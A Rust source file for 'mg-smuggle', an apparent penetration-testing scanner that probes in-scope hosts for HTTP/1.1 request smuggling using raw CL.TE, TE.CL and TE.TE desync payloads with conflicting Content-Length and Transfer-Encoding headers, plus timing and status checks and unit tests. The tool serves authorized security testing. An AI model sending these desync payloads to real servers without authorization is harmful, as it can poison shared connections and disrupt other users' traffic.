/*******************************************************************
 * Filename:        smuggle.rs
 * Author:          Jeff
 * Date:            2026-05-17
 * Description:     mg-smuggle — HTTP/1.1 request smuggling detector.
 *                  Tests CL.TE, TE.CL, and TE.TE variants via raw TCP/TLS.
 * Notes:           Uses tokio-rustls for HTTPS; plain TcpStream for HTTP.
 *                  Detection is timing-based (>2x baseline) plus status-code
 *                  analysis of the second pipelined response on the same conn.
 *                  Each probe is self-contained — no shared connection state.
 *******************************************************************/

use std::fs;
use std::net::ToSocketAddrs;
use std::path::Path;
use std::sync::Arc;
use std::time::{Duration, Instant};

use anyhow::{Context, Result, bail};
use bytes::BytesMut;
use clap::Parser;
use rustls::ClientConfig;
use rustls::pki_types::ServerName;
use serde::{Deserialize, Serialize};
use time::OffsetDateTime;
use time::format_description::well_known::Rfc3339;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::task::JoinSet;
use tokio_rustls::TlsConnector;

use engagement::{Engagement, FindingSeverity, ToolFinding, write_finding};

// ── Constants ────────────────────────────────────────────────────────────────

const OUTPUT_SUBDIR: &str = "smuggle";
const OUTPUT_FILE_PREFIX: &str = "results-";
const AUDIT_TOOL: &str = "mg-smuggle";
const DEFAULT_CONCURRENCY: usize = 3;
const DEFAULT_TIMEOUT_SECS: u64 = 20;
// How many bytes of each response to capture for verdict display
const BODY_PREVIEW_LEN: usize = 512;
// Second response is suspicious if status indicates a confused parser
const SUSPICIOUS_STATUSES: &[u16] = &[400, 501, 505];
// Timing multiplier: flag if second request takes more than this vs baseline
const TIMING_RATIO_THRESHOLD: f64 = 2.0;

// ── CLI ──────────────────────────────────────────────────────────────────────

#[derive(Parser, Debug)]
pub struct Args {
    /// Engagement name (must have recon/summary.json)
    engagement: String,

    /// Engagements root directory
    #[arg(long, env = "MG_ENGAGEMENTS_DIR", default_value = "engagements")]
    engagements_dir: String,

    /// Maximum concurrent host probes
    #[arg(long, default_value_t = DEFAULT_CONCURRENCY)]
    concurrency: usize,

    /// Per-probe TCP timeout in seconds
    #[arg(long, default_value_t = DEFAULT_TIMEOUT_SECS)]
    timeout: u64,
}

// ── Data types ───────────────────────────────────────────────────────────────

// Mirrors the HostRecord shape from recon/summary.json
#[derive(Debug, Clone, Deserialize)]
struct HostRecord {
    hostname: String,
    http_accessible: bool,
    #[serde(default)]
    open_ports: Vec<u16>,
}

#[derive(Deserialize)]
struct ReconSummary {
    hosts: Vec<HostRecord>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
enum ProbeKind {
    ClTe,
    TeCl,
    TeTe,
}

impl std::fmt::Display for ProbeKind {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ProbeKind::ClTe => write!(f, "CL.TE"),
            ProbeKind::TeCl => write!(f, "TE.CL"),
            ProbeKind::TeTe => write!(f, "TE.TE"),
        }
    }
}

#[derive(Debug, Serialize, PartialEq, Eq)]
enum Verdict {
    Vulnerable,
    Potential,
    Safe,
    Error,
}

// Result of one probe variant against one host
#[derive(Debug, Serialize)]
struct ProbeResult {
    host: String,
    port: u16,
    tls: bool,
    kind: ProbeKind,
    verdict: Verdict,
    first_status: Option<u16>,
    second_status: Option<u16>,
    second_body_preview: String,
    baseline_ms: u64,
    second_ms: u64,
    error: Option<String>,
}

// Top-level output written to disk
#[derive(Serialize)]
struct SmuggleResults {
    engagement: String,
    timestamp: String,
    total_probes: usize,
    vulnerable: usize,
    potential: usize,
    results: Vec<ProbeResult>,
}

// ── Helpers ───────────────────────────────────────────────────────────────────

// Determine host, port, and TLS flag from a HostRecord
fn conn_params(rec: &HostRecord) -> (String, u16, bool) {
    if rec.open_ports.contains(&443) {
        return (rec.hostname.clone(), 443, true);
    }
    if rec.open_ports.contains(&8443) {
        return (rec.hostname.clone(), 8443, true);
    }
    if rec.open_ports.contains(&80) {
        return (rec.hostname.clone(), 80, false);
    }
    if let Some(&port) = rec.open_ports.first() {
        // Treat all unknown ports as HTTP for now
        return (rec.hostname.clone(), port, false);
    }
    (rec.hostname.clone(), 443, true)
}

// Build a rustls ClientConfig that trusts the system WebPKI root store
fn make_tls_config() -> Arc<ClientConfig> {
    let root_store =
        rustls::RootCertStore::from_iter(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    Arc::new(
        ClientConfig::builder()
            .with_root_certificates(root_store)
            .with_no_client_auth(),
    )
}

// Parse the first HTTP status line from a raw response buffer
fn parse_status(buf: &[u8]) -> Option<u16> {
    let text = std::str::from_utf8(buf).ok()?;
    let line = text.lines().next()?;
    // "HTTP/1.1 400 Bad Request"
    let mut parts = line.splitn(3, ' ');
    parts.next()?;
    let code: u16 = parts.next()?.parse().ok()?;
    Some(code)
}

// Build the raw bytes for a CL.TE probe (two requests on one connection)
fn clte_probe_bytes(host: &str) -> Vec<u8> {
    // First request: CL=6 wins at frontend, TE=chunked wins at backend.
    // The "0\r\n\r\nX" is 6 bytes for CL but the backend sees a complete
    // chunked body (terminator) and then a leftover "X" that poisons the
    // next request's method line.
    let req1 = format!(
        "POST / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Content-Length: 6\r\n\
         Transfer-Encoding: chunked\r\n\
         \r\n\
         0\r\n\
         \r\n\
         X"
    );
    // Second request: a normal GET; if smuggled, "X" prefixes its method
    let req2 = format!(
        "GET / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Connection: close\r\n\
         \r\n"
    );
    let mut out = req1.into_bytes();
    out.extend_from_slice(req2.as_bytes());
    out
}

// Build the raw bytes for a TE.CL probe
fn tecl_probe_bytes(host: &str) -> Vec<u8> {
    // First request: TE=chunked wins at frontend, CL=3 wins at backend.
    // Backend reads 3 bytes ("1\r\n") and stops, leaving "X\r\n0\r\n\r\n"
    // in the pipe to prefix the next request.
    let req1 = format!(
        "POST / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Content-Length: 3\r\n\
         Transfer-Encoding: chunked\r\n\
         \r\n\
         1\r\n\
         X\r\n\
         0\r\n\
         \r\n"
    );
    let req2 = format!(
        "GET / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Connection: close\r\n\
         \r\n"
    );
    let mut out = req1.into_bytes();
    out.extend_from_slice(req2.as_bytes());
    out
}

// Build the raw bytes for a TE.TE probe (obfuscated Transfer-Encoding)
fn tete_probe_bytes(host: &str) -> Vec<u8> {
    // Two TE headers; one parser ignores the second and uses chunked,
    // the other uses identity. The goal is to desync them.
    let req1 = format!(
        "POST / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Transfer-Encoding: chunked\r\n\
         Transfer-Encoding: identity\r\n\
         Content-Length: 6\r\n\
         \r\n\
         0\r\n\
         \r\n"
    );
    let req2 = format!(
        "GET / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Connection: close\r\n\
         \r\n"
    );
    let mut out = req1.into_bytes();
    out.extend_from_slice(req2.as_bytes());
    out
}

// Read all available bytes from an async reader into a BytesMut until EOF or timeout
async fn read_response(
    reader: &mut (impl AsyncReadExt + Unpin),
    timeout: Duration,
) -> BytesMut {
    let mut buf = BytesMut::with_capacity(4096);
    let _ = tokio::time::timeout(timeout, async {
        loop {
            let n = reader.read_buf(&mut buf).await.unwrap_or(0);
            if n == 0 {
                break;
            }
        }
    })
    .await;
    buf
}

// Find the byte offset of the second HTTP response in the buffer
fn find_second_response(buf: &[u8]) -> Option<usize> {
    // Look for a second "HTTP/" that follows the first response separator
    let needle = b"HTTP/";
    // Skip the first occurrence at offset 0
    if buf.len() < needle.len() {
        return None;
    }
    let mut i = 1;
    while i + needle.len() <= buf.len() {
        if buf[i..].starts_with(needle) {
            return Some(i);
        }
        i += 1;
    }
    None
}

// ── Probe runner ──────────────────────────────────────────────────────────────

// Send the baseline GET, then send the smuggle payload + second GET, return ProbeResult
async fn run_probe(
    host: String,
    port: u16,
    tls: bool,
    kind: ProbeKind,
    timeout_secs: u64,
    tls_config: Arc<ClientConfig>,
) -> ProbeResult {
    let timeout = Duration::from_secs(timeout_secs);

    // Helper closure capturing connection details; returns Result so we can use ?
    let result = run_probe_inner(&host, port, tls, kind, timeout, tls_config).await;

    match result {
        Ok(r) => r,
        Err(e) => ProbeResult {
            host,
            port,
            tls,
            kind,
            verdict: Verdict::Error,
            first_status: None,
            second_status: None,
            second_body_preview: String::new(),
            baseline_ms: 0,
            second_ms: 0,
            error: Some(e.to_string()),
        },
    }
}

// Inner probe returning Result so we can use ? throughout
async fn run_probe_inner(
    host: &str,
    port: u16,
    tls: bool,
    kind: ProbeKind,
    timeout: Duration,
    tls_config: Arc<ClientConfig>,
) -> Result<ProbeResult> {
    let addr = format!("{host}:{port}");
    let socket_addr = addr
        .to_socket_addrs()
        .context("resolve host")?
        .next()
        .context("no addr")?;

    // Baseline: time a normal GET to establish reference latency
    let baseline_ms = {
        let t0 = Instant::now();
        let tcp = tokio::time::timeout(timeout, TcpStream::connect(socket_addr))
            .await
            .context("baseline connect timeout")?
            .context("baseline connect")?;
        let get = format!(
            "GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
        );
        if tls {
            let connector = TlsConnector::from(tls_config.clone());
            let server_name = ServerName::try_from(host.to_string())
                .context("invalid server name")?;
            let mut stream = tokio::time::timeout(timeout, connector.connect(server_name, tcp))
                .await
                .context("baseline tls timeout")?
                .context("baseline tls handshake")?;
            stream.write_all(get.as_bytes()).await.context("baseline write")?;
            read_response(&mut stream, timeout).await;
        } else {
            let mut tcp = tcp;
            tcp.write_all(get.as_bytes()).await.context("baseline write")?;
            read_response(&mut tcp, timeout).await;
        }
        t0.elapsed().as_millis() as u64
    };

    // Smuggle probe: fresh connection, send payload + second request, time second response
    let probe_bytes = match kind {
        ProbeKind::ClTe => clte_probe_bytes(host),
        ProbeKind::TeCl => tecl_probe_bytes(host),
        ProbeKind::TeTe => tete_probe_bytes(host),
    };

    let tcp2 = tokio::time::timeout(timeout, TcpStream::connect(socket_addr))
        .await
        .context("probe connect timeout")?
        .context("probe connect")?;

    let t1 = Instant::now();
    let raw_buf = if tls {
        let connector = TlsConnector::from(tls_config);
        let server_name = ServerName::try_from(host.to_string())
            .context("invalid server name")?;
        let mut stream = tokio::time::timeout(timeout, connector.connect(server_name, tcp2))
            .await
            .context("probe tls timeout")?
            .context("probe tls handshake")?;
        stream.write_all(&probe_bytes).await.context("probe write")?;
        read_response(&mut stream, timeout).await
    } else {
        let mut tcp2 = tcp2;
        tcp2.write_all(&probe_bytes).await.context("probe write")?;
        read_response(&mut tcp2, timeout).await
    };
    let second_ms = t1.elapsed().as_millis() as u64;

    let raw_slice = raw_buf.as_ref();
    let first_status = parse_status(raw_slice);

    // Locate second response in the buffer (if server returned two)
    let (second_status, second_body_preview) =
        if let Some(offset) = find_second_response(raw_slice) {
            let second_slice = &raw_slice[offset..];
            let status = parse_status(second_slice);
            let preview_end = second_slice.len().min(BODY_PREVIEW_LEN);
            let preview = String::from_utf8_lossy(&second_slice[..preview_end]).into_owned();
            (status, preview)
        } else {
            (None, String::new())
        };

    // Verdict: suspicious second status OR timing significantly over baseline
    let timing_flagged = baseline_ms > 0
        && second_ms as f64 > baseline_ms as f64 * TIMING_RATIO_THRESHOLD;
    let status_flagged = second_status
        .map(|s| SUSPICIOUS_STATUSES.contains(&s))
        .unwrap_or(false);

    let verdict = if status_flagged {
        Verdict::Vulnerable
    } else if timing_flagged {
        Verdict::Potential
    } else {
        Verdict::Safe
    };

    Ok(ProbeResult {
        host: host.to_string(),
        port,
        tls,
        kind,
        verdict,
        first_status,
        second_status,
        second_body_preview,
        baseline_ms,
        second_ms,
        error: None,
    })
}

// ── Entry point ───────────────────────────────────────────────────────────────

pub async fn run(args: Args) -> Result<()> {
    let eng = Engagement::load_named(Path::new(&args.engagements_dir), &args.engagement)
        .with_context(|| format!("load engagement {}", args.engagement))?;

    let summary_path = eng.recon_dir().join("summary.json");
    if !summary_path.exists() {
        bail!(
            "recon/summary.json not found — run `mg-recon {}` first",
            args.engagement
        );
    }

    let raw = fs::read_to_string(&summary_path).context("read summary.json")?;
    let summary: ReconSummary = serde_json::from_str(&raw).context("parse summary.json")?;

    let scope = eng.scope().context("load scope")?;
    let tls_config = make_tls_config();

    // Collect accessible in-scope hosts
    let hosts: Vec<HostRecord> = summary
        .hosts
        .into_iter()
        .filter(|h| h.http_accessible && scope.is_in_scope(&h.hostname))
        .collect();

    eprintln!(
        "mg-smuggle: {} in-scope HTTP hosts, {} probes each",
        hosts.len(),
        3
    );

    // Spawn one task per host per probe kind, drain at concurrency ceiling
    let mut join_set: JoinSet<Vec<ProbeResult>> = JoinSet::new();
    let mut all_results: Vec<ProbeResult> = Vec::new();

    for rec in hosts {
        let (host, port, use_tls) = conn_params(&rec);
        // Drain when at ceiling
        if join_set.len() >= args.concurrency
            && let Some(Ok(batch)) = join_set.join_next().await
        {
            all_results.extend(batch);
        }
        let tc = tls_config.clone();
        let timeout = args.timeout;
        let h = host.clone();
        join_set.spawn(async move {
            let mut batch = Vec::new();
            for kind in [ProbeKind::ClTe, ProbeKind::TeCl, ProbeKind::TeTe] {
                let r = run_probe(h.clone(), port, use_tls, kind, timeout, tc.clone()).await;
                batch.push(r);
            }
            batch
        });
    }
    // Drain remainder
    while let Some(Ok(batch)) = join_set.join_next().await {
        all_results.extend(batch);
    }

    let vulnerable_count = all_results
        .iter()
        .filter(|r| r.verdict == Verdict::Vulnerable)
        .count();
    let potential_count = all_results
        .iter()
        .filter(|r| r.verdict == Verdict::Potential)
        .count();

    // Print findings summary and emit standardized ToolFinding records
    println!("\n=== Smuggling Findings ===");
    for r in all_results
        .iter()
        .filter(|r| r.verdict != Verdict::Safe && r.verdict != Verdict::Error)
    {
        println!(
            "[{:?}] {} {} first={:?} second={:?} baseline={}ms second={}ms",
            r.verdict, r.host, r.kind, r.first_status, r.second_status,
            r.baseline_ms, r.second_ms
        );
        let severity = match r.verdict {
            Verdict::Vulnerable => FindingSeverity::High,
            Verdict::Potential => FindingSeverity::Medium,
            _ => continue,
        };
        let tf = ToolFinding::new(
            AUDIT_TOOL,
            format!("HTTP request smuggling ({})", r.kind),
            severity,
        )
        .url(format!("https://{}", r.host))
        .discriminator(format!("{}", r.kind))
        .evidence(format!(
            "first_status={:?} second_status={:?} baseline_ms={} second_ms={}",
            r.first_status, r.second_status, r.baseline_ms, r.second_ms
        ))
        .recommendation("Reject ambiguous Content-Length / Transfer-Encoding combinations at the front-end proxy");
        let _ = write_finding(&eng, &tf);
    }
    println!("Vulnerable: {vulnerable_count}  Potential: {potential_count}");

    // Write JSON output
    let out_dir = eng.root.join(OUTPUT_SUBDIR);
    fs::create_dir_all(&out_dir).context("create smuggle output dir")?;
    let ts = OffsetDateTime::now_utc().format(&Rfc3339)?;
    let ts_file = ts.replace(':', "-").replace('+', "Z");
    let out_path = out_dir.join(format!("{OUTPUT_FILE_PREFIX}{ts_file}.json"));

    let results = SmuggleResults {
        engagement: args.engagement.clone(),
        timestamp: ts,
        total_probes: all_results.len(),
        vulnerable: vulnerable_count,
        potential: potential_count,
        results: all_results,
    };
    let json = serde_json::to_string_pretty(&results)?;
    fs::write(&out_path, &json).context("write results JSON")?;
    println!("[*] Results written to {}", out_path.display());

    // Audit log
    let detail = format!("vulnerable={vulnerable_count} potential={potential_count}");
    let _ = eng.audit(AUDIT_TOOL, &eng.meta.target, Some(&detail));

    Ok(())
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_status_extracts_code() {
        let resp = b"HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\n\r\n";
        assert_eq!(parse_status(resp), Some(400));
    }

    #[test]
    fn parse_status_returns_none_for_empty() {
        assert_eq!(parse_status(b""), None);
    }

    #[test]
    fn find_second_response_locates_offset() {
        let two = b"HTTP/1.1 200 OK\r\n\r\nHTTP/1.1 400 Bad Request\r\n\r\n";
        let offset = find_second_response(two).unwrap();
        assert!(offset > 0);
        assert!(two[offset..].starts_with(b"HTTP/1.1 400"));
    }

    #[test]
    fn find_second_response_none_for_single() {
        let one = b"HTTP/1.1 200 OK\r\n\r\n";
        assert!(find_second_response(one).is_none());
    }

    #[test]
    fn conn_params_prefers_https() {
        let rec = HostRecord {
            hostname: "example.com".into(),
            http_accessible: true,
            open_ports: vec![80, 443],
        };
        let (_, port, tls) = conn_params(&rec);
        assert_eq!(port, 443);
        assert!(tls);
    }

    #[test]
    fn conn_params_falls_back_to_http() {
        let rec = HostRecord {
            hostname: "example.com".into(),
            http_accessible: true,
            open_ports: vec![80],
        };
        let (_, port, tls) = conn_params(&rec);
        assert_eq!(port, 80);
        assert!(!tls);
    }

    #[test]
    fn clte_probe_bytes_contains_both_requests() {
        let bytes = clte_probe_bytes("example.com");
        let text = String::from_utf8_lossy(&bytes);
        assert!(text.contains("Content-Length: 6"));
        assert!(text.contains("Transfer-Encoding: chunked"));
        assert!(text.contains("GET / HTTP/1.1"));
    }

    #[test]
    fn tecl_probe_bytes_contains_chunked_body() {
        let bytes = tecl_probe_bytes("example.com");
        let text = String::from_utf8_lossy(&bytes);
        assert!(text.contains("Content-Length: 3"));
        assert!(text.contains("Transfer-Encoding: chunked"));
    }

    #[test]
    fn tete_probe_bytes_has_two_te_headers() {
        let bytes = tete_probe_bytes("example.com");
        let text = String::from_utf8_lossy(&bytes);
        let count = text.matches("Transfer-Encoding:").count();
        assert_eq!(count, 2);
    }
}
